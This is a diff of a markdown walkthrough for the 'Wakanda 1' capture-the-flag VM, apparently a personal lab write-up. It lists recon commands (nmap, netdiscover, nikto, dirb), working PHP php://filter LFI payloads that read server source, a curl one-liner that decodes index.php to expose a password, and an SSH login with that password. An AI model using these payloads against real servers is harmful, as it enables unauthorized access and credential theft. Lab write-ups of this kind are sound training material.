@@ -1,34 +1,42 @@
 # Wakanda 1
 
 
-##[step 1] Finding Ip Address
-> nmap [nmap -sT 192.168.0.0/24]
-> netdiscover -r 192.168.0.0/24
+## [step 1] Finding Ip Address
+
+> nmap nmap -sT 192.168.0.0/24 
+>
+> netdiscover -r 192.168.0.0/24 \
+>
 > arp-scan -l
 
 ## [step 2] Finding Port 
 > nmap [nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.56.101]
-  nikto [nikto -h 192.168.56.101]
+>
+> nikto [nikto -h 192.168.56.101]
 
 ## [step 3] Directory
 > directory buster [dirb  192.168.156.101]
-  nikto [nikto -h 192.168.56.101]
+>
+> nikto [nikto -h 192.168.56.101]
 
 ## [step 4] web pages analysis and decoding
 > curl 
-  curl -I 192.168.56.101/fr.php
-  curl -I 192.168.56.101/index.php
+>
+> curl -I 192.168.56.101/fr.php
+>
+> curl -I 192.168.56.101/index.php
 ### As there was this in line in source page :  <!-- <a class="nav-link active" href="?lang=fr">Fr/a> -->
 #### The commented HTML seems to suggest LFI vulnerability is present with the lang parameter.
 #### So try this: 
 > [http://192.168.56.101/index.php] this is homepage.So we'll try  LFI/RFI attack,using Wrappers.
 Wrapper php://filter
-http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
-http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
-http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
+- http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+- http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+- http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
 
 > After [http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index]
-there are  encoded words.
+>
+#### there are  encoded words.
 
 > According to PHP official documentation, PHP supports four categories of filters.
 >
@@ -41,10 +49,12 @@ there are  encoded words.
 ##### Of the above, base64-encode filter from the conversion filter can be used to retrieve arbitrary server file through LFI. It is also possible to use zlib.inflate or bzip2.compress from the compression filters to retrieve server files without executing them. But I prefer to use base64-encode because of its ease of use
 
 > curl http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d
-We'll get php code in which there is password.
+>
+#### We'll get php code in which there is password.
 
 ## [Step 5] ssh
 > try login through ssh
+>
 > ssh -p3333 mamadou@192.168.56.101
 
 ### we'll get a python shell after login
